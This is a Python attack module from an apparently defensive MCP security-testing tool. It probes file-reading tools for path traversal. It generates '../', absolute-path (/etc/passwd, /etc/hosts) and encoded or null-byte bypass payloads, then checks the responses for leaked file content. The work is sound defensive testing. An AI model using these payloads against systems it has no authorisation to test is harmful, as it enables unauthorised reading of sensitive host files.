"""Path traversal / arbitrary file access: no LLM, no injection — call a
file-reading tool directly with a set of traversal payloads and see
whether a real, deterministic code-level check confines it to its
intended directory, or it just reads whatever's asked for. Model-free by
design, like tool_authz_probe.py/destructive_authz_probe.py — whether a
path argument escapes its intended root is entirely a target-owned code
property, no model involved anywhere.

Four payload categories, not one — the third was added after validating
this design against Damn Vulnerable MCP Server's real Challenge 3, whose
actual vulnerable read_file() needs no "../" syntax at all: it accepts a
plain absolute path directly, with zero validation. A payload set that
only tried relative "../" escalation would have missed that real
vulnerability shape entirely. The fourth (encoded) exists because a guard
that blocks the literal substring "../" without canonicalizing the
resolved path is itself a common, distinct failure mode — scored
separately so a target that stops plain "../" and absolute paths, but
still falls for one of these bypasses, reads as a real partial rather
than a clean pass.
1. Relative "../" escalation targeting a project-convention marker
   filename ("secret.txt") — this project's own fixtures are built so
   this exact relative path resolves to a marker file outside the
   intended sandbox, giving a deterministic, confirmed proof.
2. Relative "../" escalation targeting well-known, near-universally-
   present real system files — best-effort signal against a real target
   whose filesystem layout is unknown.
3. The same well-known system files tried as plain absolute paths, no
   "../" at all — catches targets that reject "../" specifically but
   never think to reject an absolute path outright.
4. Encoded/bypass variants of relative escalation: "....//" repeated
   (collapses to "../" after one non-recursive `str.replace("../", "")`
   pass — a real, well-known sanitizer bypass, and the only one of this
   category with deterministic proof against a target that does no
   decoding of its own, since it's pure string-replacement trickery, not
   URL-decoding); "..%2f" / "%2e%2e/" / "%2e%2e%2f" percent-encoded forms
   (effective only against a target that url-decodes the path itself —
   best-effort, no deterministic proof against this project's own
   fixtures); and a literal "%00" suffix, the classic (largely
   historical) null-byte-truncation bypass — also best-effort.
A marker-category hit is only accepted if the response actually contains
the real marker signature ("PATH TRAVERSAL MARKER") rather than merely
being non-empty, and a best-effort-category hit is only accepted if the
response contains that well-known file's own near-universal content
signature ("localhost" for /etc/hosts, "root:" for /etc/passwd) —
positive proof the real target file came back, not merely the absence of
error-shaped phrasing. Both added to close a false-positive class that a
real DVMCP Challenge 3 validation run surfaced: its read_file() catches
its own file-not-found case internally and returns a descriptive "Error:
File 'X' not found." string as ordinary, successful tool output rather
than a protocol-level error, which the original loop mistook for a
genuine hit. A stoplist of error-like phrases was tried first and
rejected: a hardened target that rejects via plain-text phrasing like
"outside the allowed directory" would still pass any finite stoplist and
be misread as a successful escape, so the check requires positive
evidence of the real file instead.

Reading isn't destructive, so the real call always happens regardless of
--safe — there's no equivalent to "don't actually delete the account"
here. What --safe gates is what's stored and displayed: a real traversal
hit against a real target could return real, sensitive host content, so
by default the response is masked (core/secrets_scan.py's existing
find_secret_like_strings/mask_secret) and hard-truncated to a short
preview before it ever reaches a Finding or a report. --no-safe stores
the full, unmasked response for the operator's own investigation of
their own target.
"""

from __future__ import annotations

from dataclasses import dataclass

from gaslight.core.attacks.base import CHECK_FAIL, CHECK_PASS, AttackModule, CheckResult, Finding
from gaslight.core.llm import LLMProvider
from gaslight.core.schema import WELL_KNOWN_FILE_SIGNATURES, find_file_read_tool, naive_arguments
from gaslight.core.secrets_scan import redact_and_truncate
from gaslight.core.sink import Sink
from gaslight.core.target import Target

_MARKER_FILENAME = "secret.txt"
_MAX_DEPTH = 5
_PREVIEW_LENGTH = 150

_MARKER_SIGNATURE = "PATH TRAVERSAL MARKER"


@dataclass
class _Hit:
    """One accepted traversal hit within a sub-check category."""

    reason: str
    confirmed: bool  # True for a marker (confirmed) hit, False for best-effort


def _dotdot_payloads() -> list[tuple[str, bool, str | None]]:
    """Relative "../" escalation — the project-convention marker (confirmed
    proof) plus well-known real-system files (best-effort). Each payload is
    paired with whether it targets the marker and the positive content
    signature a genuine hit must contain (the marker case checks
    _MARKER_SIGNATURE directly, so its signature slot is None)."""
    payloads: list[tuple[str, bool, str | None]] = []
    for depth in range(1, _MAX_DEPTH + 1):
        prefix = "../" * depth
        payloads.append((prefix + _MARKER_FILENAME, True, None))
        for target, signature in WELL_KNOWN_FILE_SIGNATURES.items():
            payloads.append((prefix + target, False, signature))
    return payloads


def _absolute_payloads() -> list[tuple[str, bool, str | None]]:
    """The same well-known files as plain absolute paths, no "../" at all —
    a distinct defense from relative traversal: a target can reject one and
    not the other (DVMCP Challenge 3's read_file() accepts a bare absolute
    path with zero validation). Scored as its own sub-check for exactly that
    reason."""
    return [("/" + target, False, signature) for target, signature in WELL_KNOWN_FILE_SIGNATURES.items()]


def _encoded_payloads() -> list[tuple[str, bool, str | None]]:
    """Payloads that survive a guard checking only for the literal "../"
    substring, rather than canonicalizing the resolved path — a distinct
    failure mode from plain relative/absolute traversal, and the reason this
    is its own sub-check (fs-encoded): a target can stop categories 1-3 above
    and still fall for one of these.

    "....//" repeated `depth` times is the one payload here with
    deterministic proof against a target that does no decoding of its own: a
    single non-recursive `str.replace("../", "")` pass collapses each unit to
    "../", so N units yields the correct depth of real traversal — pure
    string-replacement trickery, not URL-decoding, so it works against this
    project's own fixtures. The percent-encoded and null-byte variants are
    best-effort only (they need the target to decode them itself), included
    for real-world coverage the same way ssrf_probe.py's cloud-metadata tier
    is best-effort."""
    payloads: list[tuple[str, bool, str | None]] = []
    for depth in range(1, _MAX_DEPTH + 1):
        bypass_prefix = "....//" * depth
        payloads.append((bypass_prefix + _MARKER_FILENAME, True, None))
        for target, signature in WELL_KNOWN_FILE_SIGNATURES.items():
            payloads.append((bypass_prefix + target, False, signature))
    for depth in range(1, _MAX_DEPTH + 1):
        for encoded_prefix in ("..%2f" * depth, "%2e%2e/" * depth, "%2e%2e%2f" * depth):
            payloads.append((encoded_prefix + _MARKER_FILENAME, True, None))
    payloads.append((_MARKER_FILENAME + "%00.txt", True, None))
    for target, signature in WELL_KNOWN_FILE_SIGNATURES.items():
        payloads.append((target + "%00", False, signature))
    return payloads


class PathTraversalAttack(AttackModule):
    key = "path-traversal"
    name = "Path Traversal / Arbitrary File Access"
    description = (
        'Calls a file-reading tool directly with "../" and absolute-path payloads — no '
        "model, no injection — and checks whether a real code-level check confines it to "
        "its intended directory."
    )

    def __init__(self, *, safe: bool = True) -> None:
        if not isinstance(safe, bool):
            raise TypeError(f"safe must be a bool, got {type(safe).__name__}")
        self._safe = safe

    async def run(self, target: Target, provider: LLMProvider, sink: Sink) -> Finding:
        # provider is accepted to satisfy the AttackModule interface but
        # unused — this attack never invokes a model, that's the point.
        read_tool, path_field = find_file_read_tool(target.tools)
        if read_tool is None or path_field is None:
            return Finding(
                attack_key=self.key,
                fired=False,
                reason="no viable file-reading tool with a path-like field to probe.",
                attempted=False,
            )

        # Three independent defenses, scored separately: relative "../"
        # escalation, plain absolute paths, and encoded/bypass variants of
        # relative escalation. All three are always evaluated (no early
        # return across them) so a target that stops some but not others
        # reads as a real partial rather than all-or-nothing.
        dotdot_hit = await self._probe(target, read_tool, path_field, _dotdot_payloads())
        absolute_hit = await self._probe(target, read_tool, path_field, _absolute_payloads())
        encoded_hit = await self._probe(target, read_tool, path_field, _encoded_payloads(), tag="encoded")

        checks = [
            CheckResult("fs-dotdot", CHECK_FAIL if dotdot_hit else CHECK_PASS),
            CheckResult("fs-absolute", CHECK_FAIL if absolute_hit else CHECK_PASS),
            CheckResult("fs-encoded", CHECK_FAIL if encoded_hit else CHECK_PASS),
        ]
        hits = [h for h in (dotdot_hit, absolute_hit, encoded_hit) if h is not None]
        if hits:
            # Headline the strongest evidence: a confirmed (marker) hit over a
            # best-effort one.
            hits.sort(key=lambda h: not h.confirmed)
            return Finding(attack_key=self.key, fired=True, reason=hits[0].reason, checks=checks)

        return Finding(
            attack_key=self.key,
            fired=False,
            reason=(
                f"{read_tool.name} — no traversal payload returned readable content outside "
                "its intended directory."
            ),
            checks=checks,
        )

    async def _probe(self, target, read_tool, path_field, payloads, *, tag=None):
        """Try one category's payloads; return the first accepted hit (with its
        confidence) or None. A hit requires positive content proof — the marker
        signature, or the target file's own near-universal signature — never a
        merely non-empty or non-error response. `tag`, when given, names the
        bypass category in the reason string (e.g. "encoded") so the report
        tells the operator which kind of guard gap was found, not just that one
        existed."""
        for payload, is_marker, expected_signature in payloads:
            args = naive_arguments(read_tool.input_schema, exclude=path_field)
            args[path_field] = payload
            result = await target.call_tool(read_tool.name, args)
            if result.is_error:
                continue
            text = Target.result_text(result)
            if not text.strip():
                continue
            if is_marker:
                if _MARKER_SIGNATURE not in text:
                    continue
            elif expected_signature not in text:
                continue

            preview = text if not self._safe else redact_and_truncate(text, _PREVIEW_LENGTH)
            confidence = "confirmed" if is_marker else "best-effort"
            qualifier = f"{confidence}, {tag}" if tag else confidence
            reason = (
                f"{read_tool.name} escaped its intended directory via "
                f"{path_field}={payload!r} ({qualifier}) — response: {preview!r}"
            )
            return _Hit(reason=reason, confirmed=is_marker)
        return None
